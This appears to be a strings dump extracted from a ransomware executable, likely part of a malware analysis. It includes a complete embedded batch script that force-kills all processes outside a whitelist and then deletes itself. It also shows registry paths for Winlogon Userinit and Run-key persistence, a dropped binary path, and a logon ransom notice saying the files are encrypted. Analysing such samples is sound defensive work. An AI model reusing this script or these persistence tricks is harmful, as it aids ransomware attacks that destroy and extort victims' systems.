[Strings]
nth paddr      vaddr      len  size section type    string
753 0x0000b33d 0x0040d13d 1138 1139 .data   ascii   SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe:               \r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nExit\r\n:Kill\r\nIf "%~1"=="cmd.exe" (\r\nTaskKill /F /FI "PID ne %MyPID%" /FI "IMAGENAME eq cmd.exe"\r\n) Else (\r\nTaskKill /F /IM "%~1"\r\n)\r\ndel W.bat\r\nExit /B\r\n
754 0x0000b7b4 0x0040d5b4 53   54   .data   ascii   SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
755 0x0000b7ea 0x0040d5ea 44   45   .data   ascii   Software\Microsoft\Windows NT\CurrentVersion
756 0x0000b817 0x0040d617 46   47   .data   ascii   SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
757 0x0000b846 0x0040d646 6    7    .data   ascii   unlock
758 0x0000b84e 0x0040d64e 11   12   .data   ascii   ProductName
759 0x0000b85a 0x0040d65a 23   24   .data   ascii   Windows version unknown
760 0x0000b872 0x0040d672 6    7    .data   ascii   Hacked
761 0x0000b87a 0x0040d67a 8    9    .data   ascii   Userinit
762 0x0000b884 0x0040d684 21   22   .data   ascii   c:\Windows\bfsvcm.exe
763 0x0000b89a 0x0040d69a 33   34   .data   ascii   C:\Windows\system32\userinit.exe,
764 0x0000b8bd 0x0040d6bd 55   56   .data   ascii   C:\Windows\system32\userinit.exe,c:\Windows\bfsvcm.exe,
765 0x0000b8f6 0x0040d6f6 38   39   .data   ascii   "c:\Windows\notepad.exe" c:\ReadMe.TxT
766 0x0000b91e 0x0040d71e 18   19   .data   ascii   LegalNoticeCaption
767 0x0000b931 0x0040d731 24   25   .data   ascii   SeSystemProfilePrivilege
768 0x0000b94a 0x0040d74a 15   16   .data   ascii   LegalNoticeText
769 0x0000b95a 0x0040d75a 41   42   .data   ascii   Attention!!! Your files are encrypted !!!
770 0x0000b984 0x0040d784 62   63   .data   ascii   To recover files, follow the prompts in the text file "Readme"
771 0x0000ba7e 0x0040e07e 5    12   .rsrc   utf16le crypt
772 0x0000ba90 0x0040e090 13   28   .rsrc   utf16le MS Sans Serif

